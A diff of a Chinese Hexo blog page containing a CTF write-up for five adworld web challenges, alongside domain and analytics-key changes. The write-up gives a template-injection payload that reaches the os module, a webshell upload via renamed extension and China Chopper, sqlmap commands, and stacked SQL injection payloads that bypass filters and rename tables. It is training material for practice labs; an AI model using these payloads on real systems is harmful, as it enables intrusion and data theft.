@@ -16,15 +16,15 @@
     <title>CTF-攻防世界Web题目2 | P1n9</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
-    <link rel="stylesheet" type="text/css" href="https://image.12679.top/awesome/css/all.css">
-    <link rel="stylesheet" type="text/css" href="https://image.12679.top/materialize/materialize.min.css">
-    <link rel="stylesheet" type="text/css" href="https://image.12679.top/aos/aos.css">
-    <link rel="stylesheet" type="text/css" href="https://image.12679.top/animate/animate.min.css">
-    <link rel="stylesheet" type="text/css" href="https://image.12679.top/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="https://image.p1n9.cn/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="https://image.p1n9.cn/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="https://image.p1n9.cn/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="https://image.p1n9.cn/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="https://image.p1n9.cn/lightGallery/css/lightgallery.min.css">
     <link rel="stylesheet" type="text/css" href="/css/matery.css">
     <link rel="stylesheet" type="text/css" href="/css/my.css">
 
-    <script src="https://image.12679.top/jquery/jquery.min.js"></script>
+    <script src="https://image.p1n9.cn/jquery/jquery.min.js"></script>
     
 <meta name="generator" content="Hexo 5.2.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
@@ -285,7 +285,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://image.12679.top/featureimages/21.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://image.p1n9.cn/featureimages/21.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -303,7 +303,7 @@
 <main class="post-container content">
 
     
-    <link rel="stylesheet" href="https://image.12679.top/tocbot/tocbot.css">
+    <link rel="stylesheet" href="https://image.p1n9.cn/tocbot/tocbot.css">
 <style>
     #articleContent h1::before,
     #articleContent h2::before,
@@ -443,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-04-14
+                    2021-12-15
                 </div>
                 
 
@@ -468,9 +468,9 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="一、PHP2"><a href="#一、PHP2" class="headerlink" title="一、PHP2"></a>一、<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=4820&amp;page=1">PHP2</a></h2><p><strong>题目</strong><br><img src="http://image.12679.top/blog/21.1.png"></p>
-<p><strong>解题方法</strong><br>这道题就不知道怎么找到这个index.phps的，我看的题解，直接就说这个源代码泄漏了；<br>1、访问index.phps查看源代码<br><img src="http://image.12679.top/blog/21.2.png"><br>2、从代码中可以看出，id参数需要经过两次url编码<br><img src="http://image.12679.top/blog/21.3.png"><br>3、因为%的url编码为%25，所以可以用某个字母的二次url编码，这里用d字母，接着输入<code>http://111.198.29.45:47786/?id=a%2564min</code><br><img src="http://image.12679.top/blog/21.4.png"><br>4、最后得到flag</p>
-<h2 id="二、unserialize3"><a href="#二、unserialize3" class="headerlink" title="二、unserialize3"></a>二、<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=4821&amp;page=1">unserialize3</a></h2><p><strong>题目：</strong><br><img src="http://image.12679.top/blog/21.5.png"></p>
+                <h2 id="一、PHP2"><a href="#一、PHP2" class="headerlink" title="一、PHP2"></a>一、<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=4820&amp;page=1">PHP2</a></h2><p><strong>题目</strong><br><img src="https://image.p1n9.cn/blog/21.1.png"></p>
+<p><strong>解题方法</strong><br>这道题就不知道怎么找到这个index.phps的，我看的题解，直接就说这个源代码泄漏了；<br>1、访问index.phps查看源代码<br><img src="https://image.p1n9.cn/blog/21.2.png"><br>2、从代码中可以看出，id参数需要经过两次url编码<br><img src="https://image.p1n9.cn/blog/21.3.png"><br>3、因为%的url编码为%25，所以可以用某个字母的二次url编码，这里用d字母，接着输入<code>http://111.198.29.45:47786/?id=a%2564min</code><br><img src="https://image.p1n9.cn/blog/21.4.png"><br>4、最后得到flag</p>
+<h2 id="二、unserialize3"><a href="#二、unserialize3" class="headerlink" title="二、unserialize3"></a>二、<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=4821&amp;page=1">unserialize3</a></h2><p><strong>题目：</strong><br><img src="https://image.p1n9.cn/blog/21.5.png"></p>
 <p><strong>漏洞：</strong></p>
 <pre><code>__wakeup()：将在序列化之后立即被调用。
 漏洞原理：当反序列化字符串中，表示属性个数的值大于其真实值，则跳过__wakeup()执行。</code></pre>
@@ -486,34 +486,34 @@ public function __wakeup(){
 $a = new xctf();
 echo(serialize($a));
 ?&gt;</code></pre>
-<p><img src="http://image.12679.top/blog/21.6.png"><br>3、正常请求返回bad request<br><img src="http://image.12679.top/blog/21.7.png"><br>4、修改参数个数<br><img src="http://image.12679.top/blog/21.8.png"><br>5、得到flag</p>
-<h2 id="三、upload1"><a href="#三、upload1" class="headerlink" title="三、upload1"></a>三、<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=4822&amp;page=1">upload1</a></h2><p><strong>题目</strong><br><img src="http://image.12679.top/blog/21.9.png"></p>
-<p><strong>解题方法</strong><br>1、这是一个简单的上传文件漏洞，这里只需要图片格式的，我将带有一句话木马的jpg文件上传之后，用中国菜刀连接，连接不上；<br>2、问题出在了我传上去的后缀是jpg，不会在服务器运行，用burpsuite截获报文，修改文件名字，改为1.php;<br><img src="http://image.12679.top/blog/21.10.png"><br>3、用中国菜刀连接；<br><img src="http://image.12679.top/blog/21.11.png"><br>4、查找flag文件<br><img src="http://image.12679.top/blog/21.12.png"><br>找到flag值<br><img src="http://image.12679.top/blog/21.13.png"></p>
-<h2 id="四、Web-python-template-injection"><a href="#四、Web-python-template-injection" class="headerlink" title="四、Web_python_template_injection"></a>四、<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5408&amp;page=1">Web_python_template_injection</a></h2><p><strong>题目：</strong><br><img src="http://image.12679.top/blog/21.14.png"><br><img src="http://image.12679.top/blog/21.15.png"></p>
-<p><strong>解题基础</strong><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/187845.html">从零学习flask模板注入</a><br><strong>解题方法：</strong><br>1、首先简单在后面加上14,证明存在这个漏洞<br><img src="http://image.12679.top/blog/21.16.png"><br>2、之后输入查看当前目录有哪些文件</p>
+<p><img src="https://image.p1n9.cn/blog/21.6.png"><br>3、正常请求返回bad request<br><img src="https://image.p1n9.cn/blog/21.7.png"><br>4、修改参数个数<br><img src="https://image.p1n9.cn/blog/21.8.png"><br>5、得到flag</p>
+<h2 id="三、upload1"><a href="#三、upload1" class="headerlink" title="三、upload1"></a>三、<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=4822&amp;page=1">upload1</a></h2><p><strong>题目</strong><br><img src="https://image.p1n9.cn/blog/21.9.png"></p>
+<p><strong>解题方法</strong><br>1、这是一个简单的上传文件漏洞，这里只需要图片格式的，我将带有一句话木马的jpg文件上传之后，用中国菜刀连接，连接不上；<br>2、问题出在了我传上去的后缀是jpg，不会在服务器运行，用burpsuite截获报文，修改文件名字，改为1.php;<br><img src="https://image.p1n9.cn/blog/21.10.png"><br>3、用中国菜刀连接；<br><img src="https://image.p1n9.cn/blog/21.11.png"><br>4、查找flag文件<br><img src="https://image.p1n9.cn/blog/21.12.png"><br>找到flag值<br><img src="https://image.p1n9.cn/blog/21.13.png"></p>
+<h2 id="四、Web-python-template-injection"><a href="#四、Web-python-template-injection" class="headerlink" title="四、Web_python_template_injection"></a>四、<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5408&amp;page=1">Web_python_template_injection</a></h2><p><strong>题目：</strong><br><img src="https://image.p1n9.cn/blog/21.14.png"><br><img src="https://image.p1n9.cn/blog/21.15.png"></p>
+<p><strong>解题基础</strong><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/187845.html">从零学习flask模板注入</a><br><strong>解题方法：</strong><br>1、首先简单在后面加上14,证明存在这个漏洞<br><img src="https://image.p1n9.cn/blog/21.16.png"><br>2、之后输入查看当前目录有哪些文件</p>
 <pre><code>{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].listdir('.')}}</code></pre>
-<p><img src="http://image.12679.top/blog/21.17.png"><br>3、查看fl4g文件内容<br><img src="http://image.12679.top/blog/21.18.png"><br>4、最终获得flag</p>
-<h2 id="五、supersqli"><a href="#五、supersqli" class="headerlink" title="五、supersqli"></a>五、<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5417&amp;page=1">supersqli</a></h2><p><strong>题目：</strong><br><img src="http://image.12679.top/blog/21.19.png"><br><img src="http://image.12679.top/blog/21.20.png"></p>
-<p><strong>解题方法：</strong><br>1、一看就知道需要用sqlmap进行一下测试是否存在sql注入，手动测试也可以；<br><img src="http://image.12679.top/blog/21.21.png"><br>结果找到一个数据库，查不出表的内容，怪不得说sqlmap是没有灵魂的，还是人工加工具稳妥一点；</p>
+<p><img src="https://image.p1n9.cn/blog/21.17.png"><br>3、查看fl4g文件内容<br><img src="https://image.p1n9.cn/blog/21.18.png"><br>4、最终获得flag</p>
+<h2 id="五、supersqli"><a href="#五、supersqli" class="headerlink" title="五、supersqli"></a>五、<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5417&amp;page=1">supersqli</a></h2><p><strong>题目：</strong><br><img src="https://image.p1n9.cn/blog/21.19.png"><br><img src="https://image.p1n9.cn/blog/21.20.png"></p>
+<p><strong>解题方法：</strong><br>1、一看就知道需要用sqlmap进行一下测试是否存在sql注入，手动测试也可以；<br><img src="https://image.p1n9.cn/blog/21.21.png"><br>结果找到一个数据库，查不出表的内容，怪不得说sqlmap是没有灵魂的，还是人工加工具稳妥一点；</p>
 <pre><code>sqlmap -u http://111.198.29.45:50137/?inject=1 -dbs
 sqlmap -u http://111.198.29.45:50137/?inject=1 -D "supersqli" --tables</code></pre>
-<p><img src="http://image.12679.top/blog/21.22.png"><br><img src="http://image.12679.top/blog/21.23.png"></p>
-<p>2、当在url框中写union select内容时，出现内容：<br><img src="http://image.12679.top/blog/21.24.png"><br>说明将数据库查询语句在inject里面被过滤了，不过可以采用其他方法绕过；<br>3、输入show tables;</p>
+<p><img src="https://image.p1n9.cn/blog/21.22.png"><br><img src="https://image.p1n9.cn/blog/21.23.png"></p>
+<p>2、当在url框中写union select内容时，出现内容：<br><img src="https://image.p1n9.cn/blog/21.24.png"><br>说明将数据库查询语句在inject里面被过滤了，不过可以采用其他方法绕过；<br>3、输入show tables;</p>
 <pre><code>http://111.198.29.45:50137/?inject=1' ;show tables; #</code></pre>
-<p><img src="http://image.12679.top/blog/21.25.png"><br>找到对应的表<br>4、输入：</p>
+<p><img src="https://image.p1n9.cn/blog/21.25.png"><br>找到对应的表<br>4、输入：</p>
 <pre><code>http://111.198.29.45:50137/?inject=1%27%20;show%20columns%20from%20`words`;#</code></pre>
-<p><img src="http://image.12679.top/blog/21.26.png"></p>
+<p><img src="https://image.p1n9.cn/blog/21.26.png"></p>
 <pre><code>http://111.198.29.45:50137/?inject=1%27%20;show%20columns%20from%20`1919810931114514`;#</code></pre>
-<p><img src="http://image.12679.top/blog/21.27.png"><br>5、之后有三种方法可以获取目标值：<br>1&gt;需要绕过select的限制，可以使用预编译的方式</p>
+<p><img src="https://image.p1n9.cn/blog/21.27.png"><br>5、之后有三种方法可以获取目标值：<br>1&gt;需要绕过select的限制，可以使用预编译的方式</p>
 <pre><code>';set @sql = CONCAT('se','lect * from `1919810931114514`;');prepare stmt from @sql;EXECUTE stmt;#</code></pre>
-<p><img src="http://image.12679.top/blog/21.28.png"><br>发现被过滤，由于strstr不区分大小写，所以将其大写即可</p>
+<p><img src="https://image.p1n9.cn/blog/21.28.png"><br>发现被过滤，由于strstr不区分大小写，所以将其大写即可</p>
 <pre><code>';SET @sql = CONCAT('se','lect * from `1919810931114514`;');PREPARE stmt from @sql;EXECUTE stmt;#</code></pre>
-<p><img src="http://image.12679.top/blog/21.29.png"></p>
+<p><img src="https://image.p1n9.cn/blog/21.29.png"></p>
 <p>2&gt;我们将表1919810931114514名字改为words，flag列名字改为id，那么就能得到flag的内容了</p>
 <pre><code>'; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#</code></pre>
 <p>拆分开就是：</p>
 <pre><code>';alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#</code></pre>
-<p>然后使用<code>1' or 1=1#</code>即可查询出flag<br><img src="http://image.12679.top/blog/21.30.png"><br>3&gt;使用handler查询：</p>
+<p>然后使用<code>1' or 1=1#</code>即可查询出flag<br><img src="https://image.p1n9.cn/blog/21.30.png"><br>3&gt;使用handler查询：</p>
 <pre><code>';handler `1919810931114514` open;handler `1919810931114514` read first;#</code></pre>
 
             </div>
@@ -530,7 +530,7 @@ sqlmap -u http://111.198.29.45:50137/?inject=1 -D "supersqli" --tables</code></p
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://12679.top" rel="external nofollow noreferrer">P1n9</a>
+                    <a href="http://p1n9.cn" rel="external nofollow noreferrer">P1n9</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -540,7 +540,7 @@ sqlmap -u http://111.198.29.45:50137/?inject=1 -D "supersqli" --tables</code></p
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://12679.top/2020/04/14/21/">http://12679.top/2020/04/14/21/</a>
+                    <a href="http://p1n9.cn/2020/04/14/21/">http://p1n9.cn/2020/04/14/21/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -553,7 +553,7 @@ sqlmap -u http://111.198.29.45:50137/?inject=1 -D "supersqli" --tables</code></p
                     本博客所有文章除特別声明外，均采用
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     许可协议。转载请注明来源
-                    <a href="http://12679.top" target="_blank">P1n9</a>
+                    <a href="http://p1n9.cn" target="_blank">P1n9</a>
                     !
                 </span>
             </div>
@@ -861,12 +861,12 @@ sqlmap -u http://111.198.29.45:50137/?inject=1 -D "supersqli" --tables</code></p
 </div>
 
 <script src="/libs/valine/av-min.js"></script>
-<script src="https://image.12679.top/valine/Valine.min.js"></script>
+<script src="https://image.p1n9.cn/valine/Valine.min.js"></script>
 <script>
     new Valine({
         el: '#vcomments',
-        appId: 'I3wOlp7afLKRV583imHzIju3-gzGzoHsz',
-        appKey: 'WKVJsARrWKVFK0wdDoInKM71',
+        appId: 'AyuymwyNaLFfImI9Q3TNPVAN-gzGzoHsz',
+        appKey: 'xx1nOrSBta51mL5WB1exTdOs',
         notify: 'false' === 'true',
         verify: 'false' === 'true',
         visitor: 'true' === 'true',
@@ -892,7 +892,7 @@ sqlmap -u http://111.198.29.45:50137/?inject=1 -D "supersqli" --tables</code></p
                     <div class="card-image">
                         
                         
-                        <img src="https://image.12679.top/featureimages/22.jpg" class="responsive-img" alt="CTF-攻防世界Web题目3">
+                        <img src="https://image.p1n9.cn/featureimages/22.jpg" class="responsive-img" alt="CTF-攻防世界Web题目3">
                         
                         <span class="card-title">CTF-攻防世界Web题目3</span>
                     </div>
@@ -947,7 +947,7 @@ sqlmap -u http://111.198.29.45:50137/?inject=1 -D "supersqli" --tables</code></p
                     <div class="card-image">
                         
                         
-                        <img src="https://image.12679.top/featureimages/20.jpg" class="responsive-img" alt="CTF-攻防世界Web题目1">
+                        <img src="https://image.p1n9.cn/featureimages/20.jpg" class="responsive-img" alt="CTF-攻防世界Web题目1">
                         
                         <span class="card-title">CTF-攻防世界Web题目1</span>
                     </div>
@@ -1079,7 +1079,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
 </div>
 
 
-<script src="https://image.12679.top/tocbot/tocbot.min.js"></script>
+<script src="https://image.p1n9.cn/tocbot/tocbot.min.js"></script>
 <script>
     $(function () {
         tocbot.init({
@@ -1167,11 +1167,11 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             <span id="year">2020</span>
-            <a href="http://12679.top" target="_blank">P1n9</a>
+            <a href="http://p1n9.cn" target="_blank">P1n9</a>
 			&nbsp;&nbsp;
             
             <span id="icp"><img src="/medias/icp.png" style="vertical-align: text-bottom;" />
-                <a href="http://www.beian.miit.gov.cn" target="_blank">晋ICP备20001718号-1</a>
+                <a href="http://www.beian.miit.gov.cn" target="_blank">晋ICP备20001718号-2</a>
             </span>
             
 			<br>
@@ -1306,16 +1306,16 @@ $(function () {
 </div>
 
 
-    <script src="https://image.12679.top/materialize/materialize.min.js"></script>
-    <script src="https://image.12679.top/masonry/masonry.pkgd.min.js"></script>
-    <script src="https://image.12679.top/aos/aos.js"></script>
-    <script src="https://image.12679.top/scrollprogress/scrollProgress.min.js"></script>
-    <script src="https://image.12679.top/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="https://image.p1n9.cn/materialize/materialize.min.js"></script>
+    <script src="https://image.p1n9.cn/masonry/masonry.pkgd.min.js"></script>
+    <script src="https://image.p1n9.cn/aos/aos.js"></script>
+    <script src="https://image.p1n9.cn/scrollprogress/scrollProgress.min.js"></script>
+    <script src="https://image.p1n9.cn/lightGallery/js/lightgallery-all.min.js"></script>
     <script src="/js/matery.js"></script>
 
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-161839843-1"></script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-LXJ93MF8W5"></script>
 <script>
     window.dataLayer = window.dataLayer || [];
     function gtag() {
@@ -1323,7 +1323,7 @@ $(function () {
     }
 
     gtag('js', new Date());
-    gtag('config', 'UA-161839843-1');
+    gtag('config', 'G-LXJ93MF8W5');
 </script>
 
 
@@ -1333,7 +1333,7 @@ $(function () {
     var _hmt = _hmt || [];
     (function () {
         var hm = document.createElement("script");
-        hm.src = "https://hm.baidu.com/hm.js?7fc02ada382f9c86da55ef7e31ca60f8";
+        hm.src = "https://hm.baidu.com/hm.js?e1b8c0884f83ab30bdc4fb0fcd4c7b44";
         var s = document.getElementsByTagName("script")[0];
         s.parentNode.insertBefore(hm, s);
     })();
@@ -1356,10 +1356,10 @@ $(function () {
 </script>
 
     
-    <script src="https://image.12679.top/others/clicklove.js" async="async"></script>
+    <script src="https://image.p1n9.cn/others/clicklove.js" async="async"></script>
     
     
-    <script async src="https://image.12679.top/others/busuanzi.pure.mini.js"></script>
+    <script async src="https://image.p1n9.cn/others/busuanzi.pure.mini.js"></script>
     
 
     
@@ -1370,17 +1370,17 @@ $(function () {
     <script type="text/javascript" color="0,0,255"
         pointColor="0,0,255" opacity='0.7'
         zIndex="-1" count="99"
-        src="https://image.12679.top/background/canvas-nest.js"></script>
+        src="https://image.p1n9.cn/background/canvas-nest.js"></script>
     
 
     
 
     
-    <script type="text/javascript" src="https://image.12679.top/background/ribbon-dynamic.js" async="async"></script>
+    <script type="text/javascript" src="https://image.p1n9.cn/background/ribbon-dynamic.js" async="async"></script>
     
     
     
-    <script src="https://image.12679.top/instantpage/instantpage.js" type="module"></script>
+    <script src="https://image.p1n9.cn/instantpage/instantpage.js" type="module"></script>
     
 	
 	<!-- 页面点击特效 -->
